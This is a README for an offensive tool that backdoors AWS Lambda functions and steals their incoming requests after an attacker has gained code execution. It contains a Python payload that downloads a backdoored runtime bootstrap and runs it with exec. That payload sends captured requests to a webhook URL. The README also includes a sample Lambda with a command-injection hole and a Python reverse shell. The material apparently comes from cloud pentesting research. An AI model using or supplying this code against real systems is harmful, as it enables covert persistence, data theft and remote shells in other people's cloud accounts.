# lambda_bootstrap_switcher

This projects is useful to steal request from lambda and is based on:

- https://unit42.paloaltonetworks.com/gaining-persistency-vulnerable-lambdas/
- https://github.com/twistlock/lambda-persistency-poc/blob/master/poc/switch_runtime.py
- https://github.com/Djkusik/serverless_persistency_poc/blob/master/aws/exploit_files/evil_bootstrap.py
- https://github.com/aws/aws-lambda-python-runtime-interface-client/tree/main/awslambdaric

For more info check: https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence

To perform this attack you need to find a RCE vulnerability inside a Lambda function, one you have taht you can load the malicious bootstrap from this repo executing:

```python
python3 <<EOF
import os
import urllib3

# Download backdoored bootstrap
http = urllib3.PoolManager()
backdoored_bootstrap_url = "https://raw.githubusercontent.com/carlospolop/lambda_bootstrap_switcher/main/backdoored_bootstrap.py"
new_runtime = http.request('GET', backdoored_bootstrap_url).data

# Get invocation id
resp = http.request("GET", "127.0.0.1:9001/2018-06-01/runtime/invocation/next")
invoke_id = resp.headers["Lambda-Runtime-Aws-Request-Id"]

# Load new bootstrap
os.environ['URL_EXFIL'] = "https://webhook.site/c7036f43-ce42-442f-99a6-8ab21402a7c0"

exec(new_runtime)
EOF
```

Note how it's possible to indicate in the env variable `URL_EXFIL` the URL where you want to receive the exfiltrated requests.


If you want to try it you can create a vulnerable Lambda with a code such as:

```python
import json
import os
def lambda_handler(event, context):
    data = "hello"
    if event["queryStringParameters"].get("cmd"):
        data = os.popen(event["queryStringParameters"]["cmd"]).read()
    
    elif event["queryStringParameters"].get("ip") and event["queryStringParameters"].get("port"):
        rev_shell(event["queryStringParameters"]["ip"], int(event["queryStringParameters"]["port"]))
        data = "called rev shell"
    
    return {
        'statusCode': 200,
        'body': json.dumps(data)
    }

def rev_shell(ip, port):
    import socket
    import subprocess
    import os
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip,int(port)))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    p=subprocess.call(["/bin/sh","-i"])
```
